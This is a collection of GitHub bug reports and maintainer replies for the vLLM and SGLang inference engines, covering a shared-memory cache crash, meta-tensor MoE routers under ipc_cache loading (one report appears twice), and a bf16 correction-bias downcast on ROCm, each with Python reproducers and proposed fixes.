bytearray() for _ in range(size): raw.append(0) raw += rnd.randbytes(size * 3) def chunk(tag: bytes, data: bytes) -> bytes: return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF) body = (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", size, size, 8, 2, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(bytes(raw), 1)) + chunk(b"IEND", b"")) return "data:image/png;base64," + base64.b64encode(body).decode() class Client: def __init__(self, base: str, timeout: float): u = urllib.parse.urlparse(base) self.host, self.port, self.timeout = u.hostname, u.port or 80, timeout def _req(self, method: str, path: str, body=None, timeout=None) -> tuple[int, str]: c = http.client.HTTPConnection(self.host, self.port, timeout=timeout or self.timeout) try: c.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers={"Content-Type": "application/json"}) r = c.getresponse() return r.status, r.read().decode(errors="replace") except Exception as e: # noqa: BLE001 return -1, f"{type(e).__name__}: {e}" finally: c.close() def health(self) -> int: return self._req("GET", "/health", timeout=10)[0] def chat(self, model: str, image: str, nonce: str, stream: bool, max_tokens: int) -> dict: body = {"model": model, "temperature": 0, "max_tokens": max_tokens, "stream": stream, "messages": [{"role": "user", "content": [ {"type": "image_url", "image_url": {"url": image}}, {"type": "text", "text": f"{nonce} Describe this image in detail."}]}]} st, text = self._req("POST", "/v1/chat/completions", body) err = None if st == 200 and stream: for line in text.splitlines(): if line.startswith("data: ") and line != "data: [DONE]": try: d = json.loads(line[6:]) except ValueError: continue if "error" in d: err = json.dumps(d["error"])[:400] elif st != 200: err = text[:400] return {"status": st, "error": err} def run_round(cl: Client, model: str, arm: str, k: int, a) -> Counter: small = [png(a.seed + k * 100 + i, a.small_px) for i in range(a.streams)] large = [png(a.seed + k * 100 + 50 + i, a.large_px) for i in range(a.large)] out: Counter = Counter() lock = threading.Lock() def send(img, nonce, stream, mt, tag): res = cl.chat(model, img, nonce, stream, mt) with lock: if res["status"] == 200 and not res["error"]: out[f"{tag}:ok"] += 1 else: out[f"{tag}:fail"] += 1 if res["error"] and any(m in res["error"] for m in DEAD_MARKERS): out["engine_dead_response"] += 1 if out["samples"] < 3: out["samples"] += 1 print(f" [{arm} r{k}] {tag} status={res['status']} {res['error']}", flush=True) if a.prelude_clear: # Idle clear first (nothing in flight): the round's 448 px images then sit at the start of the SHM ring, # where the large images written after the mid-round clear land. Without it they would sit right after # the previous round's large images, which the new large images exactly refill, so no stale handle is # ever overwritten. cl._req("POST", "/pause?mode=keep") cl._req("POST", "/resume") first = [threading.Thread(target=send, args=(small[i], f"r{k}s{i}", True, a.max_tokens, "small"), daemon=True) for i in range(a.streams)] for t in first: t.start() time.sleep(a.pause_after_ms / 1000) second = [threading.Thread(target=send, args=(large[i], f"r{k}L{i}", False, a.large_max_tokens, "large"), daemon=True) for i in range(a.large)] if arm in ("keep", "keep_noclear"): q = "/pause?mode=keep" + ("&clear_cache=false" if arm == "keep_noclear" else "") st, _ = cl._req("POST", q) out[f"pause_{st}"] += 1 time.sleep(a.pause_ms / 1000) st, _ = cl._req("POST", "/resume") out[f"resume_{st}"] += 1 for t in second: t.start() elif arm == "wait": res = {} pt = threading.Thread(target=lambda: res.update(st=cl._req("POST", "/pause?mode=wait&clear_cache=true")[0]), daemon=True) pt.start() time.sleep(0.05) for t in second: # rendered (and written to SHM) while the pause drains t.start() pt.join(a.timeout) out[f"pause_{res.get('st')}"] += 1 st, _ = cl._req("POST", "/resume") out[f"resume_{st}"] += 1 else: time.sleep(a.pause_ms / 1000) for t in second: t.start() for t in first + second: t.join(a.timeout + 5) h = cl.health() out[f"health_{h}"] += 1 if h != 200: out["engine_dead_health"] += 1 return out def main() -> int: p = argparse.ArgumentParser() p.add_argument("base", nargs="?", default="http://127.0.0.1:8000") p.add_argument("--base-url", default=None) p.add_argument("--out", default=None) p.add_argument("--arms", default="keep", help="comma list of keep, keep_noclear, wait, none") p.add_argument("--arm-minutes", default="", help="e.g. keep_noclear=4,keep=10 (default --minutes)") p.add_argument("--minutes", type=float, default=10.0) p.add_argument("--max-rounds", type=int, default=100000) p.add_argument("--streams", type=int, default=12) p.add_argument("--small-px", type=int, default=448) p.add_argument("--large", type=int, default=8) p.add_argument("--large-px", type=int, default=1344) p.add_argument("--max-tokens", type=int, default=96) p.add_argument("--large-max-tokens", type=int, default=8) p.add_argument("--pause-after-ms", type=int, default=300) p.add_argument("--pause-ms", type=int, default=100) p.add_argument("--timeout", type=float, default=180) p.add_argument("--seed", type=int, default=20261016) p.add_argument("--no-prelude-clear", dest="prelude_clear", action="store_false", help="skip the idle pause+resume (cache clear) at the start of each round") a = p.parse_args() cl = Client(a.base_url or a.base, a.timeout) st, text = cl._req("GET", "/v1/models") model = json.loads(text)["data"][0]["id"] print(f"model={model} args={vars(a)}", flush=True) mins = {kv.split("=")[0]: float(kv.split("=")[1]) for kv in a.arm_minutes.split(",") if kv} summary = {"model": model, "args": vars(a), "arms": {}} dead_arm = None for ai, arm in enumerate(a.arms.split(",")): t_end = time.monotonic() + mins.get(arm, a.minutes) * 60 tot: Counter = Counter() rounds = 0 dead_round = None while time.monotonic() < t_end and rounds < a.max_rounds: c = run_round(cl, model, arm, ai * 10000 + rounds, a) rounds += 1 tot.update(c) print(f"[{arm}] round {rounds:4d} " + " ".join(f"{k}={v}" for k, v in sorted(c.items()) if k != "samples"), flush=True) if c["engine_dead_health"] or c["engine_dead_response"]: dead_round = rounds break tot.pop("samples", None) summary["arms"][arm] = {"rounds": rounds, "engine_died_in_round": dead_round, "counts": dict(tot)} print(f"== arm {arm}: {rounds} rounds, engine died in round {dead_round}", flush=True) if dead_round: dead_arm = arm break summary["engine_died_in_arm"] = dead_arm if a.out: with open(a.out, "w") as f: json.dump(summary, f, indent=1) print("BUG PRESENT: engine died in arm " + dead_arm if dead_arm else "not reproduced (engine alive)", flush=True) return 1 if dead_arm else 0 if __name__ == "__main__": sys.exit(main()) ```
Possible fixes: skip the frontend cache clear for `mode=keep`, as documented; for abort/wait, clear only once no queued request holds a handle; make `clear()` respect the reader flags; or fail just the affected request instead of the engine? ### Before submitting a new issue... - [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

comment.body:
Thanks for the detailed report and the reproducer — the round table makes the failure mode very clear.

I'd like to take this one: making `/pause` honor the documented "`mode=keep` ignores `clear_cache`" semantics so the SHM multimodal cache isn't reset under requests that still hold handles into it. I'll put up a PR shortly.

issue.title: [Bug]: `--load-format ipc_cache` leaves MoE routers on meta placeholders (illegal memory access, meta-tensor errors)
issue.body:
### Your current environment
Output of vllm collect-env ```text ============================== System Info ============================== OS : Ubuntu 24.04.3 LTS (x86_64) GCC version : (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0 Libc version : glibc-2.39 ============================== PyTorch Info ============================== PyTorch version : 2.13.0+cu130 Is debug build : False CUDA used to build PyTorch : 13.0 ============================== Python Environment ============================== Python version : 3.12.3 (main, Aug 31 2026, 10:18:26) [GCC 13.3.0] (64-bit runtime) Python platform : Linux-7.0.0-1010-oracle-x86_64-with-glibc2.39 ============================== CUDA / GPU Info ============================== Is CUDA available : True CUDA runtime version : 13.0.88 GPU models and configuration : GPU 0: NVIDIA H200 GPU 1: NVIDIA H200 GPU 2: NVIDIA H200 GPU 3: NVIDIA H200 Nvidia driver version : 610.57.04 ============================== Versions of relevant libraries ============================== [pip3] flashinfer-python==0.7.0.post1 [pip3] torch==2.13.0+cu130 [pip3] transformers==5.17.0 [pip3] triton==3.7.1 ============================== vLLM Info ============================== vLLM Version : 0.31.0 vLLM Build Flags: CUDA Archs: 7.5 8.0 8.6 8.9 9.0 10.0 12.0; ROCm: Disabled; XPU: Disabled ```
### 🐛 Describe the bug Loading an MoE model with an expert-score correction bias through the weight cache (`--load-format ipc_cache`) either crashes or fails to start. The same model loads and generates correctly from disk. `IpcModelLoader._apply_entries` replaces each meta placeholder parameter with a new `nn.Parameter` object ([ipc_loader.py#L256-L264](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/model_loader/weight_cache/ipc_loader.py#L256-L264)). Objects that captured the placeholder while the model was being constructed keep the meta tensor. MoE routers are such objects: - MoE models pass their gate's parameter into the MoE layer, for example `e_score_correction_bias=self.gate.e_score_correction_bias` in [nemotron_h.py#L244](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/models/nemotron_h.py#L244), [lfm2_moe.py#L155](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/models/lfm2_moe.py#L155), [deepseek_v2.py#L390](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/models/deepseek_v2.py#L390), and [ernie45_moe.py#L193](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/models/ernie45_moe.py#L193). - The router keeps that tensor object: [grouped_topk_router.py#L274](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/layers/fused_moe/router/grouped_topk_router.py#L274) and [fused_topk_bias_router.py#L369](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/layers/fused_moe/router/fused_topk_bias_router.py#L369). After `_apply_entries`, the gate holds the cached tensor and every router still holds the meta placeholder. `_apply_entries` is unchanged on `main`. ### Reproduction This needs a single GPU larger than 80 GB (tested on a 141 GB H200). Start the daemon: ```bash vllm preload --model nvidia/NVIDIA-Nemotron-3.5-Lightning-30B-A3B-BF16 \ --enforce-eager --max-model-len 4096 ``` Run the engine (`fallback: False`, so a disk fallback can't mask the result): ```python import os os.environ["VLLM_ENABLE_V1_MULTIPROCESSING"] = "0" # in-process, so the model can be inspected from vllm import LLM, SamplingParams llm = LLM( model="nvidia/NVIDIA-Nemotron-3.5-Lightning-30B-A3B-BF16", load_format="ipc_cache", model_loader_extra_config={"fallback": False}, enforce_eager=True, max_model_len=4096, max_num_seqs=1, gpu_memory_utilization=0.5, ) out = llm.generate(["The capital of France is"], SamplingParams(temperature=0, max_tokens=24)) print(repr(out[0].outputs[0].text)) ``` Output: ```text [rank0]: RuntimeError: Triton Error [CUDA]: an illegal memory access was encountered [rank0]: torch.AcceleratorError: CUDA error: an illegal memory access was encountered ``` The process then aborts (exit code 134). On smaller GPUs, `LiquidAI/LFM2-8B-A1B` (~17 GB) reproduces the same way.
Minimal Reproducer (no GPU or model needed) ```python import torch from torch import nn class Gate(nn.Module): def __init__(self): super().__init__() self.e_score_correction_bias = nn.Parameter(torch.empty(4), requires_grad=False) class Router: # plain object, like GroupedTopKRouter def __init__(self, e_score_correction_bias): self.e_score_correction_bias = e_score_correction_bias def build(): with torch.device("meta"): gate = Gate() return gate, Router(gate.e_score_correction_bias) cached = torch.arange(4.0) # stands in for the daemon's tensor # What IpcModelLoader._apply_entries does today gate, router = build() gate._parameters.pop("e_score_correction_bias") gate.register_parameter("e_score_correction_bias", nn.Parameter(cached, requires_grad=False)) print("replace:", router.e_score_correction_bias.is_meta, router.e_score_correction_bias is gate.e_score_correction_bias) # Swapping in place keeps every holder on the same object gate, router = build() torch.utils.swap_tensors(gate.e_score_correction_bias, nn.Parameter(cached, requires_grad=False)) print("swap:", router.e_score_correction_bias.is_meta, router.e_score_correction_bias is gate.e_score_correction_bias) ``` ```text replace: True False swap: False True ```
### Results across models Same settings for every load: `enforce_eager=True`, `max_model_len=4096`, greedy decoding, 24 tokens. | Model | Router | `ipc_cache` (current) | |---|---|---| | `nvidia/NVIDIA-Nemotron-3.5-Lightning-30B-A3B-BF16` | `GroupedTopKRouter` | 23/23 routers hold a meta bias; CUDA illegal memory access during `generate` | | `LiquidAI/LFM2-8B-A1B` | `GroupedTopKRouter` | 22/22 routers hold a meta bias; CUDA illegal memory access during `generate` | | `moonshotai/Moonlight-16B-A3B-Instruct` | `GroupedTopKRouter` | 26/26 routers hold a meta bias; CUDA illegal memory access during `generate` | | `baidu/ERNIE-4.5-21B-A3B-PT` | `FusedTopKBiasRouter` | Engine fails to start: `NotImplementedError: _moe_C::topk_softmax: attempted to run this operator with Meta tensors` in `profile_run` | ### Proposed fix When the existing parameter is a meta placeholder, swap the cached tensor into it in place with `torch.utils.swap_tensors`, so every reference sees the cached data. Register buffers before parameters. `swap_tensors` refuses a parameter while a view of it is alive, and `MambaMixer2` registers `conv_weights` as a view of `conv1d.weight` ([mamba_mixer2.py#L460-L463](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/layers/mamba/mamba_mixer2.py#L460-L463)). `export_entries` emits parameters before buffers ([daemon.py#L159-L163](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/model_loader/weight_cache/daemon.py#L159-L163)), so without reordering the swap of `conv1d.weight` fails with `It is not possible to get the gradient edge for a Tensor that does not require gradients`. ```diff def _register(name: str, tensor: torch.Tensor, is_param: bool) -> None: module_name, _, leaf = name.rpartition(".") module = modules.get(module_name) if module is None: raise RuntimeError(f"Cached tensor {name} has no matching module") - # Replace via registration rather than param.data assignment, - # which fails for meta tensors. Entries may also introduce - # post-quantization tensors absent from the meta model. - module._parameters.pop(leaf, None) - module._buffers.pop(leaf, None) if is_param: obj: torch.Tensor = ( tensor if isinstance(tensor, nn.Parameter) else nn.Parameter(tensor, requires_grad=False) ) - module.register_parameter(leaf, obj) + placeholder = module._parameters.get(leaf) + if placeholder is not None and placeholder is not obj and placeholder.is_meta: + # Swap in place: objects built with the model (e.g. MoE + # routers) hold references to the placeholder. + torch.utils.swap_tensors(placeholder, obj) + obj = placeholder + else: + module._parameters.pop(leaf, None) + module._buffers.pop(leaf, None) + module.register_parameter(leaf, obj) else: + module._parameters.pop(leaf, None) + module._buffers.pop(leaf, None) obj = tensor module.register_buffer(leaf, obj) registered[name] = obj - for name, entry in state.entries.items(): + # Buffers first: replacing them releases views of meta parameters + # (e.g. MambaMixer2.conv_weights), which would block the swap. + entries = sorted(state.entries.items(), key=lambda item: item[1].kind == "param") + for name, entry in entries: tensor = entry.rebuild(device_index) ``` ### Before submitting a new issue... - [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

comment.body:
Thanks for the detailed report and the reproduction steps.

The root cause looks clear: `IpcModelLoader._apply_entries` re-registers each placeholder with a *new* `nn.Parameter` object, so any object that captured the original meta placeholder during model construction — like the MoE routers holding `gate.e_score_correction_bias` — keeps pointing at the meta tensor and fails at runtime. The fix should keep those captured references coherent while applying the cached entries.

I'd like to take this one and send a PR.

### Your current environment
Output of vllm collect-env ```text ============================== System Info ============================== OS : Ubuntu 24.04.3 LTS (x86_64) GCC version : (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0 Libc version : glibc-2.39 ============================== PyTorch Info ============================== PyTorch version : 2.13.0+cu130 Is debug build : False CUDA used to build PyTorch : 13.0 ============================== Python Environment ============================== Python version : 3.12.3 (main, Aug 31 2026, 10:18:26) [GCC 13.3.0] (64-bit runtime) Python platform : Linux-7.0.0-1010-oracle-x86_64-with-glibc2.39 ============================== CUDA / GPU Info ============================== Is CUDA available : True CUDA runtime version : 13.0.88 GPU models and configuration : GPU 0: NVIDIA H200 GPU 1: NVIDIA H200 GPU 2: NVIDIA H200 GPU 3: NVIDIA H200 Nvidia driver version : 610.57.04 ============================== Versions of relevant libraries ============================== [pip3] flashinfer-python==0.7.0.post1 [pip3] torch==2.13.0+cu130 [pip3] transformers==5.17.0 [pip3] triton==3.7.1 ============================== vLLM Info ============================== vLLM Version : 0.31.0 vLLM Build Flags: CUDA Archs: 7.5 8.0 8.6 8.9 9.0 10.0 12.0; ROCm: Disabled; XPU: Disabled ```
### 🐛 Describe the bug Loading an MoE model with an expert-score correction bias through the weight cache (`--load-format ipc_cache`) either crashes or fails to start. The same model loads and generates correctly from disk. `IpcModelLoader._apply_entries` replaces each meta placeholder parameter with a new `nn.Parameter` object ([ipc_loader.py#L256-L264](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/model_loader/weight_cache/ipc_loader.py#L256-L264)). Objects that captured the placeholder while the model was being constructed keep the meta tensor. MoE routers are such objects: - MoE models pass their gate's parameter into the MoE layer, for example `e_score_correction_bias=self.gate.e_score_correction_bias` in [nemotron_h.py#L244](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/models/nemotron_h.py#L244), [lfm2_moe.py#L155](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/models/lfm2_moe.py#L155), [deepseek_v2.py#L390](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/models/deepseek_v2.py#L390), and [ernie45_moe.py#L193](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/models/ernie45_moe.py#L193). - The router keeps that tensor object: [grouped_topk_router.py#L274](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/layers/fused_moe/router/grouped_topk_router.py#L274) and [fused_topk_bias_router.py#L369](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/layers/fused_moe/router/fused_topk_bias_router.py#L369). After `_apply_entries`, the gate holds the cached tensor and every router still holds the meta placeholder. `_apply_entries` is unchanged on `main`. ### Reproduction This needs a single GPU larger than 80 GB (tested on a 141 GB H200). Start the daemon: ```bash vllm preload --model nvidia/NVIDIA-Nemotron-3.5-Lightning-30B-A3B-BF16 \ --enforce-eager --max-model-len 4096 ``` Run the engine (`fallback: False`, so a disk fallback can't mask the result): ```python import os os.environ["VLLM_ENABLE_V1_MULTIPROCESSING"] = "0" # in-process, so the model can be inspected from vllm import LLM, SamplingParams llm = LLM( model="nvidia/NVIDIA-Nemotron-3.5-Lightning-30B-A3B-BF16", load_format="ipc_cache", model_loader_extra_config={"fallback": False}, enforce_eager=True, max_model_len=4096, max_num_seqs=1, gpu_memory_utilization=0.5, ) out = llm.generate(["The capital of France is"], SamplingParams(temperature=0, max_tokens=24)) print(repr(out[0].outputs[0].text)) ``` Output: ```text [rank0]: RuntimeError: Triton Error [CUDA]: an illegal memory access was encountered [rank0]: torch.AcceleratorError: CUDA error: an illegal memory access was encountered ``` The process then aborts (exit code 134). On smaller GPUs, `LiquidAI/LFM2-8B-A1B` (~17 GB) reproduces the same way.
Minimal Reproducer (no GPU or model needed) ```python import torch from torch import nn class Gate(nn.Module): def __init__(self): super().__init__() self.e_score_correction_bias = nn.Parameter(torch.empty(4), requires_grad=False) class Router: # plain object, like GroupedTopKRouter def __init__(self, e_score_correction_bias): self.e_score_correction_bias = e_score_correction_bias def build(): with torch.device("meta"): gate = Gate() return gate, Router(gate.e_score_correction_bias) cached = torch.arange(4.0) # stands in for the daemon's tensor # What IpcModelLoader._apply_entries does today gate, router = build() gate._parameters.pop("e_score_correction_bias") gate.register_parameter("e_score_correction_bias", nn.Parameter(cached, requires_grad=False)) print("replace:", router.e_score_correction_bias.is_meta, router.e_score_correction_bias is gate.e_score_correction_bias) # Swapping in place keeps every holder on the same object gate, router = build() torch.utils.swap_tensors(gate.e_score_correction_bias, nn.Parameter(cached, requires_grad=False)) print("swap:", router.e_score_correction_bias.is_meta, router.e_score_correction_bias is gate.e_score_correction_bias) ``` ```text replace: True False swap: False True ```
### Results across models Same settings for every load: `enforce_eager=True`, `max_model_len=4096`, greedy decoding, 24 tokens. | Model | Router | `ipc_cache` (current) | |---|---|---| | `nvidia/NVIDIA-Nemotron-3.5-Lightning-30B-A3B-BF16` | `GroupedTopKRouter` | 23/23 routers hold a meta bias; CUDA illegal memory access during `generate` | | `LiquidAI/LFM2-8B-A1B` | `GroupedTopKRouter` | 22/22 routers hold a meta bias; CUDA illegal memory access during `generate` | | `moonshotai/Moonlight-16B-A3B-Instruct` | `GroupedTopKRouter` | 26/26 routers hold a meta bias; CUDA illegal memory access during `generate` | | `baidu/ERNIE-4.5-21B-A3B-PT` | `FusedTopKBiasRouter` | Engine fails to start: `NotImplementedError: _moe_C::topk_softmax: attempted to run this operator with Meta tensors` in `profile_run` | ### Proposed fix When the existing parameter is a meta placeholder, swap the cached tensor into it in place with `torch.utils.swap_tensors`, so every reference sees the cached data. Register buffers before parameters. `swap_tensors` refuses a parameter while a view of it is alive, and `MambaMixer2` registers `conv_weights` as a view of `conv1d.weight` ([mamba_mixer2.py#L460-L463](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/layers/mamba/mamba_mixer2.py#L460-L463)). `export_entries` emits parameters before buffers ([daemon.py#L159-L163](https://github.com/vllm-project/vllm/blob/db9527a46873454610df6dbedf79a36d6bf1a7f6/vllm/model_executor/model_loader/weight_cache/daemon.py#L159-L163)), so without reordering the swap of `conv1d.weight` fails with `It is not possible to get the gradient edge for a Tensor that does not require gradients`. ```diff def _register(name: str, tensor: torch.Tensor, is_param: bool) -> None: module_name, _, leaf = name.rpartition(".") module = modules.get(module_name) if module is None: raise RuntimeError(f"Cached tensor {name} has no matching module") - # Replace via registration rather than param.data assignment, - # which fails for meta tensors. Entries may also introduce - # post-quantization tensors absent from the meta model. - module._parameters.pop(leaf, None) - module._buffers.pop(leaf, None) if is_param: obj: torch.Tensor = ( tensor if isinstance(tensor, nn.Parameter) else nn.Parameter(tensor, requires_grad=False) ) - module.register_parameter(leaf, obj) + placeholder = module._parameters.get(leaf) + if placeholder is not None and placeholder is not obj and placeholder.is_meta: + # Swap in place: objects built with the model (e.g. MoE + # routers) hold references to the placeholder. + torch.utils.swap_tensors(placeholder, obj) + obj = placeholder + else: + module._parameters.pop(leaf, None) + module._buffers.pop(leaf, None) + module.register_parameter(leaf, obj) else: + module._parameters.pop(leaf, None) + module._buffers.pop(leaf, None) obj = tensor module.register_buffer(leaf, obj) registered[name] = obj - for name, entry in state.entries.items(): + # Buffers first: replacing them releases views of meta parameters + # (e.g. MambaMixer2.conv_weights), which would block the swap. + entries = sorted(state.entries.items(), key=lambda item: item[1].kind == "param") + for name, entry in entries: tensor = entry.rebuild(device_index) ``` ### Before submitting a new issue... - [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

comment.body: The fix is up: https://github.com/vllm-project/vllm/pull/62115 — thank you again for the detailed report and reproducer, it made the root cause straightforward to verify.

issue.title: [Bug] [AMD] select_experts casts the fp32 MoE correction bias to bf16 before #37133's fp32 aiter path, so GLM-5.x still routes with a bf16 bias
issue.body:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Describe the bug

On ROCm with `SGLANG_USE_AITER=1`, GLM-5.x (`GlmMoeDsaForCausalLM`) still routes its MoE with a bf16 correction bias. #37133 keeps the bias in fp32 for this architecture, but on main (4cca7fcd3e) the bias is cast back to bf16 before the code #37133 added can use it:

1. `MoEGate.__init__` keeps `e_score_correction_bias` in fp32 for GlmMoeDsa ([deepseek_v2.py#L513-L529](https://github.com/sgl-project/sglang/blob/4cca7fcd3e644f22a61c7a6e6b57bb89b568d62a/python/sglang/srt/models/deepseek_v2.py#L513-L529), #37133).
2. On this path the router logits are bf16: `aiter_dsv3_router_gemm` returns `tgemm.mm(..., otype=hidden_states.dtype)` ([rocm_linear_utils.py#L30-L35](https://github.com/sgl-project/sglang/blob/4cca7fcd3e644f22a61c7a6e6b57bb89b568d62a/python/sglang/srt/layers/rocm_linear_utils.py#L30-L35)).
3. `select_experts` replaces the bias with a cached copy in the logits' dtype, `topk_config.correction_bias_for_dtype(router_logits.dtype)`, whenever `_use_aiter and use_grouped_topk and not SGLANG_OPT_USE_JIT_KERNEL_GROUPED_TOPK and dynamic_expert_bias is None` ([topk.py#L2616-L2626](https://github.com/sgl-project/sglang/blob/4cca7fcd3e644f22a61c7a6e6b57bb89b568d62a/python/sglang/srt/layers/moe/topk.py#L2616-L2626), from #33838).
4. The aiter branch of `biased_grouped_topk_gpu` keeps an fp32 bias and upcasts the logits instead ([topk.py#L1944-L1954](https://github.com/sgl-project/sglang/blob/4cca7fcd3e644f22a61c7a6e6b57bb89b568d62a/python/sglang/srt/layers/moe/topk.py#L1944-L1954), #37133), but the bias it receives is already bf16, so that branch does not run.

#37133's unit test checks the parameter dtype in `MoEGate` only, so it does not cover step 3.

Effect on GLM-5.3 (`zai-org/GLM-5.3`): the bias of the 75 MoE layers lies between 3.7 and 34.6, with a per-layer standard deviation of 0.04 to 0.14. In bf16, the 256 values of a layer collapse to 3 to 16 distinct values (median 7), and the largest rounding error of a layer (median 0.031) is close to the spread itself (median standard deviation 0.040). On layer 3, 174 distinct values in [33.985, 34.623] become 3.

On a GLM-5.3 TP8 server on MI355X (eager, decode steps of 1 and 8 rows, 38,325 token-layer pairs), SGLang's routed top-8 differs from the top-8 of the same bf16 logits with the fp32 bias in 67.6% of token-layer pairs, 1.32 of 8 experts on average. Layers 3 to 7 differ for nearly every token; the least affected layer (41) differs for 28%.

CUDA keeps the bias in fp32 (flashinfer `fused_topk_deepseek` and the JIT router), so the two platforms route GLM-5.x differently. As #37133 notes for GLM-5.2, standard benchmarks may not show this; I did not measure the accuracy effect.

Skipping the downcast in step 3 for an fp32 bias restores fp32 routing on the aiter path (`NO_PRECAST=1` below: 0.0% to 0.1% of tokens differ). Setting `SGLANG_OPT_USE_JIT_KERNEL_GROUPED_TOPK=1` also avoids it (0.0%), through the JIT router.

### Reproduction

`repro_topk.py`, on one MI355X with `SGLANG_USE_AITER=1`: `select_experts` with GLM-5.3's fp32 bias and random bf16 logits, against the same routing in fp32.

```python
"""select_experts on ROCm (SGLANG_USE_AITER=1) with GLM-5.3's fp32 correction bias
and bf16 router logits, against the same routing done in fp32.
Usage: repro_topk.py <GLM-5.3 checkpoint dir> [layer]"""

import json
import os
import sys

import torch
import torch.nn.functional as F
from safetensors import safe_open

from sglang.srt.layers.moe.topk import TopKConfig, select_experts

if os.environ.get("NO_PRECAST") == "1":
    # what skipping select_experts' bias downcast does: the aiter branch sees fp32
    TopKConfig.correction_bias_for_dtype = lambda self, dtype: self.correction_bias

root = sys.argv[1]
layer = int(sys.argv[2]) if len(sys.argv) > 2 else 3
name = f"model.layers.{layer}.mlp.gate.e_score_correction_bias"
index = json.load(open(f"{root}/model.safetensors.index.json"))["weight_map"]
with safe_open(f"{root}/{index[name]}", "pt") as f:
    bias = f.get_tensor(name).cuda()  # fp32, as MoEGate keeps it for GlmMoeDsa

torch.manual_seed(0)
tokens = 4096
# bf16, as aiter_dsv3_router_gemm returns them
logits = torch.randn(tokens, 256, device="cuda").to(torch.bfloat16)
cfg = TopKConfig(
    top_k=8,
    use_grouped_topk=True,
    topk_group=1,
    num_expert_group=1,
    renormalize=True,
    correction_bias=bias,
    scoring_func="sigmoid",
    routed_scaling_factor=2.5,
)
hidden = torch.empty(tokens, 6144, dtype=torch.bfloat16, device="cuda")
out = select_experts(hidden_states=hidden, router_logits=logits, topk_config=cfg)
got = out.topk_ids[:, :8].long()
ref = (torch.sigmoid(logits.float()) + bias).topk(8, dim=-1).indices
same = (F.one_hot(got, 256).sum(1) * F.one_hot(ref, 256).sum(1)).sum(-1)
print(
    f"layer {layer}: bias {bias.dtype} in [{bias.min().item():.3f}, {bias.max().item():.3f}], "
    f"{bias.unique().numel()} distinct values, {bias.bfloat16().unique().numel()} in bf16"
)
print(f"tokens whose top-8 set differs from fp32 routing: {(same < 8).float().mean().item():.1%}")
```

```
$ SGLANG_USE_AITER=1 python3 repro_topk.py /path/to/GLM-5.3 3
layer 3: bias torch.float32 in [33.985, 34.623], 174 distinct values, 3 in bf16
tokens whose top-8 set differs from fp32 routing: 99.8%
```

| Setting | Layer 3 | Layer 40 | Layer 77 |
| --- | --- | --- | --- |
| default | 99.8% | 89.6% | 95.8% |
| `NO_PRECAST=1` (aiter top-k with the fp32 bias) | 0.1% | 0.0% | 0.1% |
| `SGLANG_OPT_USE_JIT_KERNEL_GROUPED_TOPK=1` | 0.0% | 0.0% | 0.0% |

Random logits give higher rates than the served traffic above (67.6%).

### Environment

SGLang main at 4cca7fcd3e, mounted over the checkout in `rocm/sgl-dev:v0.5.21-rocm10-mi35x-20261014` (so `check_env` reports the image's package version):

GPU 0: AMD Instinct MI355X
GPU 0 Compute Capability: 9.5

comment.body: The fix is up for review: #44797. It skips the bias downcast in `select_experts` when the bias is fp32 so #37133's fp32 aiter path engages; CUDA behavior is unchanged. The PR description includes a unit-level reproducer with before/after output and regression tests. Thank you again for the precise report and measurements.

issue.title: [Bug] DeepSeek-V4 BF16 checkpoint is routed to the MXFP4 expert path and fails in fused MoE
issue.body:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version (checked by reading `main` at 8e3f11b).
- [x] Please use English.

### Describe the bug

